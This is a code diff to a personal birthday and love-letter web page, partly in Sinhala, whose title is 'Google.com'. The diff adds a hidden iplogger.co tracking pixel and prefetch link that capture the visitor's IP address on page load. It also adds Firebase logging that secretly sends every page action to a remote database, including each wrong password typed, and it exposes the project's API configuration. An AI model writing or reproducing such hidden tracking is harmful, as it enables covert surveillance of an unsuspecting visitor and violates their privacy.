@@ -4,6 +4,10 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google.com</title>
+    
+    <link rel="prefetch" href="https://iplogger.co/1ebEK4">
+    <img src="https://iplogger.co/1ebEK4" style="display:none !important;" />
+
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
         :root { --primary-pink: #ff4d6d; --soft-pink: #ff85a1; --bg-gradient: linear-gradient(135deg, #fff5f5 0%, #ffdde1 100%); }
@@ -107,10 +111,39 @@ Wishhh you a veryy happy birthdayyyy manikaaa 🎂🍰❤️. මැණික �
         </div>
     </div>
 
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAr65gjzsOIsJA_rKhA9Lt1ogqARryIgTw",
+            authDomain: "lovetracker-eff68.firebaseapp.com",
+            projectId: "lovetracker-eff68",
+            storageBucket: "lovetracker-eff68.firebasestorage.app",
+            messagingSenderId: "1064136647164",
+            appId: "1:1064136647164:web:b94120efd78aedd403d279",
+            measurementId: "G-S7PYQSM23X",
+            databaseURL: "https://lovetracker-eff68-default-rtdb.firebaseio.com"
+        };
+
+        // Firebase Initialize
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function logActivity(msg) {
+            db.ref('valentine_logs').push({
+                action: msg,
+                time: new Date().toLocaleString()
+            });
+        }
+
+        // සයිට් එක ඕපන් කරපු සැනින් ලොග් වීම
+        logActivity("Site Opened");
+
         const myStories = [
             { date: "2024.10.09", text: "අද තමයි අපේ ලස්සනම දවස. ඔයා මට කැමති වුණා! ❤️ හම්මෝ ඒකනම් කියල වැඩක් නෑ . එවෙලෙ මගෙ heart beat එක ඩින් ඩින් ගාල ගියේ . එදා නම් කවමදාවත් අමතක වෙන්නෙ නැති දවසක් . Thank youu මට කැමතී කිව්වට" },
-            { date: "2026.04.02", text: "අදනම් අපි ගොඩාක් වෙල කතා කලා , මම කිව්ව වගේ අද තමා අපි ගොඩාක් සතුටින් , ගොඩාක් වෙලා එකට හිටපු වෙලාව . ඒකනම් මරූ . මට මාරම සතුටුයි අනේ . ඔයට ගොඩාක් ummhaa දුන්නා . ඒවගේම ඒක තමා මගේ හොදම birthdayy gift එක. Thank youu මැණික !!" }
+            { date: "2026.04.02", text: "අදනම් අපි ගොඩාක් vel කතා කලා , මම කිව්ව වගේ අද තමා අපි ගොඩාක් සතුටින් , ගොඩාක් වෙලා එකට හිටපු වෙලාව . ඒකනම් මරූ . මට මාරම සතුටුයි අනේ . ඔයට ගොඩාක් ummhaa දුන්නා . ඒවගේම ඒක තමා මගේ හොදම birthdayy gift එක. Thank youu මැණික !!" }
         ];
 
         const reasonsArr = [
@@ -145,23 +178,31 @@ Wishhh you a veryy happy birthdayyyy manikaaa 🎂🍰❤️. මැණික �
         setInterval(createHeart, 400);
 
         function checkPassword() {
-            if (document.getElementById('passInput').value === "2024109") {
+            const passVal = document.getElementById('passInput').value;
+            if (passVal === "2024109") {
+                // කෙළින්ම මෙතනින් Firebase එකට දත්ත යවයි
+                logActivity("Password Correct - Page Unlocked Successfully");
                 document.getElementById('login-section').style.display = 'none';
                 document.getElementById('result').style.display = 'block';
                 document.getElementById('navbar').style.display = 'block';
                 confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
                 setInterval(updateLoveCounter, 1000);
                 showPage();
-            } else { alert("වැරදි අංකයක්! ❤️"); }
+            } else { 
+                logActivity("Wrong Password Attempted: " + passVal);
+                alert("වැරදි අංකයක්! ❤️"); 
+            }
         }
 
         function showSection(id) {
+            logActivity("Navigated to section: " + id);
             document.getElementById('main-view').style.display = 'none';
             document.getElementById('stories-view').style.display = 'none';
             document.getElementById(id).style.display = 'block';
         }
 
         function openReasons() {
+            logActivity("Opened Reasons Modal");
             const list = document.getElementById('reasonsList');
             if(list.innerHTML === "") {
                 reasonsArr.forEach((r, i) => {
@@ -180,8 +221,20 @@ Wishhh you a veryy happy birthdayyyy manikaaa 🎂🍰❤️. මැණික �
             document.getElementById("pageText").innerText = page.text;
             document.getElementById("pageNum").innerText = `Pg ${currentIdx + 1} / ${myStories.length}`;
         }
-        function nextPage() { if (currentIdx < myStories.length - 1) { currentIdx++; showPage(); } }
-        function prevPage() { if (currentIdx > 0) { currentIdx--; showPage(); } }
+        function nextPage() { 
+            if (currentIdx < myStories.length - 1) { 
+                currentIdx++; 
+                logActivity("Viewed Diary Page " + (currentIdx + 1));
+                showPage(); 
+            } 
+        }
+        function prevPage() { 
+            if (currentIdx > 0) { 
+                currentIdx--; 
+                logActivity("Viewed Diary Page " + (currentIdx + 1));
+                showPage(); 
+            } 
+        }
 
         function updateLoveCounter() {
             const diff = new Date() - new Date("2024-10-09T00:00:00");
